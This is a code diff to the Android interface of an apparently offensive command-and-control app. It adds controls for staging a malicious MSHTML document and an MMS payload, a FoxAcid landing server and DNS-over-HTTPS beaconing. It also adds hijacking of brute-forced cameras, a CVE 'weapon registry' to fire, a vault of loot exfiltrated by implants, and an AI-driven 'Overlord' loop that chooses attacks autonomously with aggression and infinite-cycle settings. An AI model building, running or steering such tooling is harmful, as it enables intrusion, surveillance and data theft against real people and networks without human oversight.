@@ -9,6 +9,7 @@ import androidx.compose.foundation.layout.Row
 import androidx.compose.foundation.layout.Spacer
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.fillMaxWidth
+import androidx.compose.foundation.layout.PaddingValues
 import androidx.compose.foundation.layout.height
 import androidx.compose.foundation.layout.padding
 import androidx.compose.foundation.layout.size
@@ -84,6 +85,7 @@ import com.projectzerodays.quantumcli.c2.AuditEvent
 import com.projectzerodays.quantumcli.c2.CameraHit
 import com.projectzerodays.quantumcli.c2.C2State
 import com.projectzerodays.quantumcli.c2.Grayfish
+import com.projectzerodays.quantumcli.c2.MitreMapper
 import com.projectzerodays.quantumcli.c2.QcliApi
 import com.projectzerodays.quantumcli.c2.QuantServerManager
 import com.projectzerodays.quantumcli.c2.UpdateChecker
@@ -92,6 +94,7 @@ import com.projectzerodays.quantumcli.ops.CamWar
 import com.projectzerodays.quantumcli.ops.Net
 import com.projectzerodays.quantumcli.ops.NetDiag
 import com.projectzerodays.quantumcli.ops.Overlord
+import com.projectzerodays.quantumcli.ops.Weapons
 import com.projectzerodays.quantumcli.ui.theme.Cyan
 import com.projectzerodays.quantumcli.ui.theme.Danger
 import com.projectzerodays.quantumcli.ui.theme.Muted
@@ -153,7 +156,15 @@ object AutoRun {
             )
             return false
         }
-        Overlord.start(QuantumApp.appScope, cameraOnly, intervalSec) { aiDecide() }
+        val s = QuantSettings.state.value
+        Overlord.start(
+            QuantumApp.appScope,
+            cameraOnly,
+            intervalSec,
+            s.overlordAggression,
+            s.overlordCycles,
+            s.overlordScope.ifBlank { null },
+        ) { aiDecide() }
         return true
     }
 
@@ -711,6 +722,7 @@ fun DashboardPage() {
     val serverRunning by QuantServerManager.running.collectAsState()
     var showAutoRunDlg by remember { mutableStateOf(false) }
     var armConfirm by remember { mutableStateOf(false) }
+    var showEmojiDlg by remember { mutableStateOf(false) }
     val aiReady = AiGate.ready()
 
     Column(
@@ -767,6 +779,35 @@ fun DashboardPage() {
                 modifier = Modifier.weight(1f),
             ) { Text("CAM SWEEP") }
         }
+        Spacer(Modifier.height(8.dp))
+
+        // ---- second quick-op row: flashfill / emojisms / macreset / maldoc --
+        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            FilledTonalButton(
+                onClick = { ioOp("OK") { c2Api.handle("flashfill") } },
+                modifier = Modifier.weight(1f),
+            ) { Text("FLASHFILL") }
+            FilledTonalButton(
+                onClick = { showEmojiDlg = true },
+                modifier = Modifier.weight(1f),
+            ) { Text("EMOJISMS") }
+            FilledTonalButton(
+                onClick = { ioOp("OPSEC") { c2Api.handle("macreset") } },
+                modifier = Modifier.weight(1f),
+            ) { Text("MACRESET") }
+            FilledTonalButton(
+                onClick = {
+                    ioOp("ATK") {
+                        c2Api.handle("mshtmaldoc", JSONObject().put("ip", Net.localIp()))
+                    }
+                },
+                modifier = Modifier.weight(1f),
+            ) { Text("MALDOC") }
+        }
+        Spacer(Modifier.height(8.dp))
+
+        // ---- federation mesh + foxacid landing server ------------------------
+        FederationFoxAcidCard()
         Spacer(Modifier.height(8.dp))
 
         // ---- kill switch ----------------------------------------------------
@@ -829,6 +870,9 @@ fun DashboardPage() {
             onDismiss = { showAutoRunDlg = false },
         )
     }
+    if (showEmojiDlg) {
+        EmojiSmsDialog(onDismiss = { showEmojiDlg = false })
+    }
 }
 
 @Composable
@@ -857,6 +901,97 @@ private fun KillSwitchCard(armed: Boolean, onArm: () -> Unit, onDisarm: () -> Un
     }
 }
 
+/** Prefer a human field from a status JSON; fall back to a trimmed dump. */
+private fun statusSummary(prefix: String, r: JSONObject): String {
+    if (r.has("error")) return "$prefix ERR: ${r.optString("error")}"
+    val st = r.optString("status", "").ifBlank {
+        r.optString("state", "").ifBlank { r.optString("mode", "") }
+    }
+    return if (st.isNotBlank()) "$prefix $st" else "$prefix ${r.toString().take(60)}"
+}
+
+/** Federation peer-mesh status + FoxAcid landing-server start/stop chips. */
+@Composable
+private fun FederationFoxAcidCard() {
+    val scope = rememberCoroutineScope()
+    var fedStatus by remember { mutableStateOf("federation: tap FEDERATION to query the peer mesh") }
+    var foxStatus by remember { mutableStateOf("foxacid: tap START/STOP to toggle the landing server") }
+    fun fox(action: String) {
+        scope.launch {
+            val r = withContext(Dispatchers.IO) {
+                c2Api.handle("foxacid", JSONObject().put("action", action))
+            }
+            foxStatus = statusSummary("foxacid:", r)
+        }
+    }
+    Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
+        Text("Federation / FoxAcid", style = QuantumTypography.titleSmall, color = SoftCyan)
+        Spacer(Modifier.height(8.dp))
+        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            OutlinedButton(
+                onClick = {
+                    scope.launch {
+                        val r = withContext(Dispatchers.IO) { c2Api.handle("federation") }
+                        fedStatus = statusSummary("federation:", r)
+                    }
+                },
+                modifier = Modifier.weight(1f),
+            ) { Text("FEDERATION") }
+        }
+        Spacer(Modifier.height(6.dp))
+        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            OutlinedButton(
+                onClick = { fox("start") },
+                modifier = Modifier.weight(1f),
+            ) { Text("FOXACID START") }
+            OutlinedButton(
+                onClick = { fox("stop") },
+                modifier = Modifier.weight(1f),
+            ) { Text("FOXACID STOP") }
+        }
+        Text(fedStatus, style = QuantumTypography.bodySmall, color = SoftCyan, fontSize = 11.sp)
+        Text(foxStatus, style = QuantumTypography.bodySmall, color = SoftCyan, fontSize = 11.sp)
+    }
+}
+
+/** Small text prompt for the emojisms staging payload (default "ping"). */
+@Composable
+private fun EmojiSmsDialog(onDismiss: () -> Unit) {
+    var text by rememberSaveable { mutableStateOf("ping") }
+    AlertDialog(
+        onDismissRequest = onDismiss,
+        containerColor = Panel,
+        title = { Text("EMOJISMS payload", color = Cyan) },
+        text = {
+            Column {
+                Text(
+                    "Stage the emoji-MMS payload with this message text.",
+                    style = QuantumTypography.bodySmall,
+                    color = Muted,
+                )
+                Spacer(Modifier.height(8.dp))
+                OutlinedTextField(
+                    value = text,
+                    onValueChange = { text = it },
+                    label = { Text("text") },
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                )
+            }
+        },
+        confirmButton = {
+            Button(onClick = {
+                val t = text.ifBlank { "ping" }
+                onDismiss()
+                ioOp("OK") {
+                    c2Api.handle("emojisms", JSONObject().put("text", t))
+                }
+            }) { Text("SEND") }
+        },
+        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
+    )
+}
+
 @Composable
 private fun AutoRunDialog(
     initialCameraOnly: Boolean,
@@ -865,6 +1000,10 @@ private fun AutoRunDialog(
 ) {
     var cameraOnly by remember { mutableStateOf(initialCameraOnly) }
     var interval by remember { mutableStateOf(initialInterval.toFloat()) }
+    var aggression by remember { mutableStateOf(QuantSettings.state.value.overlordAggression) }
+    var cyclesText by remember {
+        mutableStateOf(QuantSettings.state.value.overlordCycles.toString())
+    }
     AlertDialog(
         onDismissRequest = onDismiss,
         containerColor = Panel,
@@ -897,14 +1036,39 @@ private fun AutoRunDialog(
                     valueRange = 10f..300f,
                     steps = 57,
                 )
+                Spacer(Modifier.height(8.dp))
+                Text("Aggression", color = Softest, style = QuantumTypography.bodySmall)
+                Row(Modifier.fillMaxWidth()) {
+                    listOf("balanced", "aggressive", "patient").forEach { ag ->
+                        Row(
+                            Modifier.weight(1f),
+                            verticalAlignment = Alignment.CenterVertically,
+                        ) {
+                            RadioButton(selected = aggression == ag, onClick = { aggression = ag })
+                            Text(ag, color = SoftCyan, style = QuantumTypography.labelSmall)
+                        }
+                    }
+                }
+                OutlinedTextField(
+                    value = cyclesText,
+                    onValueChange = { cyclesText = it.filter { c -> c.isDigit() }.take(5) },
+                    label = { Text("Cycles (0 = infinite)") },
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                )
             }
         },
         confirmButton = {
             Button(onClick = {
-                val ok = AutoRun.start(cameraOnly, interval.toInt())
                 QuantSettings.update {
-                    it.copy(overlordCameraOnly = cameraOnly, overlordIntervalSec = interval.toInt())
+                    it.copy(
+                        overlordCameraOnly = cameraOnly,
+                        overlordIntervalSec = interval.toInt(),
+                        overlordAggression = aggression,
+                        overlordCycles = cyclesText.toIntOrNull() ?: 0,
+                    )
                 }
+                val ok = AutoRun.start(cameraOnly, interval.toInt())
                 if (ok) onDismiss()
             }) { Text("Start") }
         },
@@ -1150,6 +1314,30 @@ private fun CameraCard(cam: CameraHit) {
                 }
             }) { Text("BRUTE CREDS") }
         }
+        Spacer(Modifier.height(8.dp))
+        // ---- PTZ nudge row — vendor PTZ over the camera control channel ------
+        Row(
+            horizontalArrangement = Arrangement.spacedBy(6.dp),
+            verticalAlignment = Alignment.CenterVertically,
+        ) {
+            Text("PTZ", style = QuantumTypography.labelSmall, color = Muted)
+            listOf("left" to "◀", "up" to "▲", "down" to "▼", "right" to "▶", "stop" to "■")
+                .forEach { (action, glyph) ->
+                    OutlinedButton(
+                        onClick = {
+                            ioOp("CAM") {
+                                if (CamWar.ptzNudge(cam.ip, cam.vendor, cam.creds, action)) {
+                                    "PTZ $action ${cam.ip}"
+                                } else {
+                                    "PTZ $action ${cam.ip} failed"
+                                }
+                            }
+                        },
+                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 2.dp),
+                        modifier = Modifier.height(34.dp),
+                    ) { Text(glyph, fontSize = 12.sp) }
+                }
+        }
     }
 }
 
@@ -1309,7 +1497,21 @@ fun ExploitsPage() {
     }
 
     val covered = remember(audit) {
-        com.projectzerodays.quantumcli.c2.MitreMapper.coverage(audit)
+        MitreMapper.coverage(audit)
+    }
+    // ranked technique counts from the real map_audit shape {counts: {Txxxx: n}}
+    val mitreRanked = remember(audit) {
+        try {
+            val counts = MitreMapper.mapAudit(audit).optJSONObject("counts") ?: JSONObject()
+            counts.keys().asSequence()
+                .filter { it.isNotBlank() }
+                .map { it to counts.optInt(it) }
+                .sortedByDescending { it.second }
+                .take(10)
+                .toList()
+        } catch (e: Exception) {
+            emptyList<Pair<String, Int>>()
+        }
     }
 
     Column(
@@ -1362,6 +1564,52 @@ fun ExploitsPage() {
         ) { Text(if (busy) "WORKING…" else "FIRE $cve") }
 
         Spacer(Modifier.height(12.dp))
+
+        // ---- weapon registry picker (tap a CVE to arm it) ---------------------
+        Text(
+            "WEAPON REGISTRY — ${Weapons.REGISTRY.size} CVEs (tap to arm)",
+            style = QuantumTypography.titleSmall,
+            color = SoftCyan,
+        )
+        Spacer(Modifier.height(6.dp))
+        Column(
+            Modifier
+                .fillMaxWidth()
+                .quantumPanel()
+                .padding(8.dp)
+                .height(240.dp)
+                .verticalScroll(rememberScrollState()),
+        ) {
+            Weapons.REGISTRY.forEach { w ->
+                Row(
+                    Modifier
+                        .fillMaxWidth()
+                        .clickable { cve = w.cve }
+                        .padding(horizontal = 4.dp, vertical = 5.dp),
+                    verticalAlignment = Alignment.CenterVertically,
+                ) {
+                    Text(
+                        w.tier,
+                        style = QuantumTypography.labelSmall,
+                        fontSize = 10.sp,
+                        color = when (w.tier) {
+                            "V3_HIGH" -> Danger
+                            "V3_MED" -> Ok
+                            "legacy" -> SoftCyan
+                            else -> Muted // V3_CHECK
+                        },
+                        modifier = Modifier.width(70.dp),
+                    )
+                    Text(
+                        "${w.cve} — ${w.name}",
+                        style = QuantumTypography.bodySmall,
+                        color = if (cve == w.cve) Cyan else Softest,
+                    )
+                }
+            }
+        }
+
+        Spacer(Modifier.height(12.dp))
         Text("Last result", style = QuantumTypography.titleSmall, color = SoftCyan)
         Column(
             Modifier
@@ -1376,8 +1624,8 @@ fun ExploitsPage() {
 
         Spacer(Modifier.height(12.dp))
         Text("${covered.size} MITRE techniques covered in the ledger.", color = Muted)
-        covered.take(8).forEach { tid ->
-            StatusCard(tid, "covered")
+        mitreRanked.forEach { (tid, n) ->
+            StatusCard(tid, "$n event${if (n == 1) "" else "s"}")
         }
         Spacer(Modifier.height(16.dp))
     }
@@ -1390,6 +1638,8 @@ fun ExploitsPage() {
 @Composable
 fun LootPage() {
     val loot by C2State.loot.collectAsState()
+    val hostCount = loot.map { it.host }.distinct().size
+    val totalBytes = loot.sumOf { it.bytes }
     Column(
         Modifier
             .fillMaxSize()
@@ -1398,10 +1648,39 @@ fun LootPage() {
     ) {
         Text("Loot", style = QuantumTypography.displaySmall, color = Cyan)
         Spacer(Modifier.height(12.dp))
-        FilledTonalButton(onClick = { ioOp("OK") {
-            C2State.scanLoot()
-            "${C2State.loot.value.size} sealed item(s) indexed"
-        } }) { Text("REFRESH VAULT") }
+
+        // ---- triage header ---------------------------------------------------
+        Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            Column(Modifier.weight(1f)) {
+                StatusCard("Items", "${loot.size} sealed")
+            }
+            Column(Modifier.weight(1f)) {
+                StatusCard("Hosts", "$hostCount")
+            }
+            Column(Modifier.weight(1f)) {
+                StatusCard("Vault size", formatBytes(totalBytes))
+            }
+        }
+        Spacer(Modifier.height(8.dp))
+
+        // ---- vault refresh + bulk seal/unseal ---------------------------------
+        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            FilledTonalButton(onClick = { ioOp("OK") {
+                C2State.scanLoot()
+                "${C2State.loot.value.size} sealed item(s) indexed"
+            } }, modifier = Modifier.weight(1f)) { Text("REFRESH VAULT") }
+        }
+        Spacer(Modifier.height(8.dp))
+        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+            FilledTonalButton(
+                onClick = { ioOp("LOOT") { lootBulkSeal() } },
+                modifier = Modifier.weight(1f),
+            ) { Text("SEAL ALL") }
+            OutlinedButton(
+                onClick = { ioOp("LOOT") { lootBulkUnseal() } },
+                modifier = Modifier.weight(1f),
+            ) { Text("UNSEAL ALL") }
+        }
         Spacer(Modifier.height(8.dp))
         if (loot.isEmpty()) {
             Text("Sealed loot appears when an implant exfiltrates via /r drop.", color = Muted)
@@ -1437,6 +1716,46 @@ fun LootPage() {
         }
         Spacer(Modifier.height(16.dp))
     }
+}
+
+/** Walk loot/<host>/ and seal every plaintext file that is not already .gfy. */
+private fun lootBulkSeal(): String {
+    var n = 0
+    C2State.lootDir.listFiles()?.filter { it.isDirectory }?.forEach { dir ->
+        dir.listFiles()?.forEach { f ->
+            if (f.isFile && !f.name.endsWith(".gfy")) {
+                try {
+                    Grayfish.seal(f)
+                    n++
+                } catch (e: Exception) {
+                    C2State.audit("ERR", "seal ${f.name} failed: ${e.message}")
+                }
+            }
+        }
+    }
+    C2State.scanLoot()
+    return "SEAL ALL — $n plaintext file(s) sealed"
+}
+
+/** Walk loot/<host>/ and unseal every .gfy file (in place). */
+private fun lootBulkUnseal(): String {
+    var n = 0
+    var fail = 0
+    C2State.lootDir.listFiles()?.filter { it.isDirectory }?.forEach { dir ->
+        dir.listFiles()?.forEach { f ->
+            if (f.isFile && f.name.endsWith(".gfy")) {
+                if (Grayfish.unseal(f) != null) n++ else fail++
+            }
+        }
+    }
+    C2State.scanLoot()
+    return "UNSEAL ALL — $n unsealed, $fail failed (key mismatch?)"
+}
+
+private fun formatBytes(b: Int): String = when {
+    b >= 1 shl 20 -> "%.1f MB".format(b / 1048576.0)
+    b >= 1 shl 10 -> "%.1f KB".format(b / 1024.0)
+    else -> "$b B"
 }
 
 // ---------------------------------------------------------------------------
@@ -1565,6 +1884,9 @@ fun SettingsPage() {
     var apiUrl by rememberSaveable { mutableStateOf(settings.apiUrl) }
     var apiKey by rememberSaveable { mutableStateOf(settings.apiKey) }
     var model by rememberSaveable { mutableStateOf(settings.model) }
+    var cyclesText by rememberSaveable { mutableStateOf(settings.overlordCycles.toString()) }
+    var scopeText by rememberSaveable { mutableStateOf(settings.overlordScope) }
+    var domainText by rememberSaveable { mutableStateOf(settings.c2Domain) }
     var updateResult by remember { mutableStateOf<UpdateChecker.Result?>(null) }
     var checking by remember { mutableStateOf(false) }
 
@@ -1677,6 +1999,58 @@ fun SettingsPage() {
             valueRange = 10f..300f,
             steps = 57,
         )
+        Spacer(Modifier.height(6.dp))
+        Text("Aggression", color = Softest, style = QuantumTypography.bodySmall)
+        Row(Modifier.fillMaxWidth()) {
+            listOf("balanced", "aggressive", "patient").forEach { ag ->
+                Row(Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
+                    RadioButton(
+                        selected = settings.overlordAggression == ag,
+                        onClick = { QuantSettings.update { it.copy(overlordAggression = ag) } },
+                    )
+                    Text(ag, color = SoftCyan, style = QuantumTypography.labelSmall)
+                }
+            }
+        }
+        Text(
+            if (settings.overlordCycles == 0) "Cycles: infinite" else "Cycles: ${settings.overlordCycles}",
+            color = Softest,
+            style = QuantumTypography.bodySmall,
+        )
+        OutlinedTextField(
+            value = cyclesText,
+            onValueChange = { v ->
+                val d = v.filter { it.isDigit() }.take(5)
+                cyclesText = d
+                QuantSettings.update { it.copy(overlordCycles = d.toIntOrNull() ?: 0) }
+            },
+            label = { Text("Cycles (0 = infinite)") },
+            singleLine = true,
+            modifier = Modifier.fillMaxWidth(),
+        )
+        Spacer(Modifier.height(6.dp))
+        OutlinedTextField(
+            value = scopeText,
+            onValueChange = { v ->
+                scopeText = v
+                QuantSettings.update { it.copy(overlordScope = v.trim()) }
+            },
+            label = { Text("Overlord target scope (CIDR)") },
+            placeholder = { Text("blank = local /24") },
+            singleLine = true,
+            modifier = Modifier.fillMaxWidth(),
+        )
+        Spacer(Modifier.height(6.dp))
+        OutlinedTextField(
+            value = domainText,
+            onValueChange = { v ->
+                domainText = v
+                QuantSettings.update { it.copy(c2Domain = v.trim()) }
+            },
+            label = { Text("C2 operator domain (GhostDNS / DoH)") },
+            singleLine = true,
+            modifier = Modifier.fillMaxWidth(),
+        )
         SettingSwitch(
             "Auto-download local AI fallback on app open",
             settings.autoDownload,
@@ -1775,13 +2149,20 @@ fun ManualDialog(onDismiss: () -> Unit) {
             ) {
                 ManualSection("HOW TO") {
                     M("1. Setup — sidebar → Setup wizard. Choose Abliteration.ai (paste your key), Local model (auto-downloads the on-device fallback once), or Skip for manual-only mode.")
-                    M("2. Auto Run — Dashboard → AUTO RUN. Unlocks once AI is configured. Camera-only restricts the act whitelist to camera operations; the interval slider controls the decision cadence.")
-                    M("3. Manual ops — every page has controls. Implants: queue PERSIST / WIPE tasks per host. Cameras: DISCOVER + BRUTE, per-camera SNAPSHOT. Exploits: FINGERPRINT, ZERO-CHECK, FIRE. Loot: UNSEAL / DELETE.")
+                    M("2. Auto Run — Dashboard → AUTO RUN. Unlocks once AI is configured. Camera-only restricts the act whitelist to camera operations; the interval slider controls the decision cadence; aggression (balanced / aggressive / patient) and cycles (0 = infinite) tune the loop; a CIDR scope limits targets (blank = local /24).")
+                    M("3. Manual ops — every page has controls. Implants: queue PERSIST / WIPE tasks per host. Cameras: DISCOVER + BRUTE, per-camera SNAPSHOT and the PTZ nudge row (◀ ▲ ▼ ▶ ■) driving the vendor PTZ channel. Exploits: FINGERPRINT, ZERO-CHECK, FIRE, plus the weapon registry — a tier-colored list (V3_HIGH red, V3_MED green, legacy cyan) where tapping a row arms its CVE into the FIRE field. Loot: triage header (items / hosts / vault size), SEAL ALL / UNSEAL ALL bulk ops, per-item UNSEAL / DELETE.")
                     M("4. Chat — natural language ('scan for cameras', 'start background job', 'kill-switch') or bare /ai commands ('run task fingerprint 10.0.0.5'). Locked until AI is configured.")
                     M("5. Kill switch — Dashboard → ARM queues wipe/die tasks on every implant and halts the overlord. DISARM stops further wipes.")
                     M("6. Network — device interfaces (IPv4/IPv6/MAC), VPN and proxy status, gateway, public egress with location, and DNS resolution with per-address location. Private addresses are never sent to external geo services.")
                     M("7. Web C2 — while the server runs, a browser dashboard is served at http://<device-ip>:<port>/dash.")
                     M("8. Updates — Settings → CHECK FOR UPDATES compares your build with the latest GitHub release and flags patch/minor bumps as safe.")
+                }
+                Spacer(Modifier.height(8.dp))
+                ManualSection("AUTONOMY + INFRA SURFACES") {
+                    M("9. Dashboard quick ops — second row: FLASHFILL (disk-pressure fill), EMOJISMS (emoji-MMS payload, prompted for text), MACRESET (MAC re-roll), MALDOC (MSHTML maldoc staged at the device IP).")
+                    M("10. Federation / FoxAcid — Dashboard chips. FEDERATION queries the peer-mesh status; FOXACID START / STOP toggles the FoxAcid landing server (status prints under the buttons and in the console).")
+                    M("11. GhostDNS / DoH C2 — /ai API + chat surfaces: 'ghostdns' with {host, domain} points a host at the operator domain configured in Settings → C2 operator domain; 'dohc2' with {action: start|stop, port?} runs beaconing through DNS-over-HTTPS.")
+                    M("12. PTZ — the nudge row speaks camera pan/tilt directly (left / up / down / right / stop); results land in the console under the CAM tag. Nudges without known credentials report an honest failure.")
                 }
                 Spacer(Modifier.height(8.dp))
                 ManualSection("TROUBLESHOOTING") {
